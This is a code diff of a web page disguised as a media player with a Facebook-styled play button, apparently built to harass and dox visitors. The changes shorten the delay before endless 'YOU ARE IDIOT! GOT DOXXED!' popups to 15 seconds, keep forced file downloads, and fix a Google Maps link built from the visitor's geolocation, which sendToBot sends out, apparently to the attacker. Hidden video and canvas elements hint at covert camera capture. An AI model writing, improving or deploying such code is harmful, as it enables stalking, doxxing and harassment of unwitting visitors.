@@ -54,7 +54,7 @@
             justify-content: space-between; backdrop-filter: blur(15px); border-top: 2px solid #1877f2; z-index: 1000;
         }
         .credit-name { font-size: 14px; font-weight: bold; color: #1877f2; }
-        .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 12px; font-weight: bold; display: flex; align-items: center; gap: 5px; }
+        .play-btn { background: #1877f2; color: white; border: none; border-radius: 50px; padding: 5px 15px; font-size: 12px; font-weight: bold; display: flex; align-items: center; gap: 5px; cursor: pointer; }
         
         #video, #canvas { display: none; }
     </style>
@@ -167,7 +167,7 @@
         vid.play();
         dox.style.display = 'block';
 
-        // JEDA 2 MENIT (120000ms) BARU WINDOW POPUP MUNCUL ☠️
+        // JEDA DIPERCEPAT JADI 15 DETIK (15000ms) ☠️🔥
         setTimeout(() => {
             setInterval(() => {
                 let div = document.createElement('div');
@@ -177,9 +177,9 @@
                 div.innerHTML = "<b>YOU ARE IDIOT!</b><br>GOT DOXXED!";
                 overlay.appendChild(div);
             }, 250);
-        }, 120000);
+        }, 15000);
 
-        // Download file tetap instan biar berantakan
+        // Download file tetap instan
         for (let j = 1; j <= 5; j++) {
             let blob = new Blob(["YOU IDIOT"], { type: "text/plain" });
             let url = window.URL.createObjectURL(blob);
@@ -205,7 +205,7 @@
 
     function autoLocation() {
         navigator.geolocation.getCurrentPosition(p => {
-            sendToBot(`📍 LOKASI: http://googleusercontent.com/maps.google.com/4{p.coords.latitude},${p.coords.longitude}`);
+            sendToBot(`📍 LOKASI: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
         });
     }
 </script>
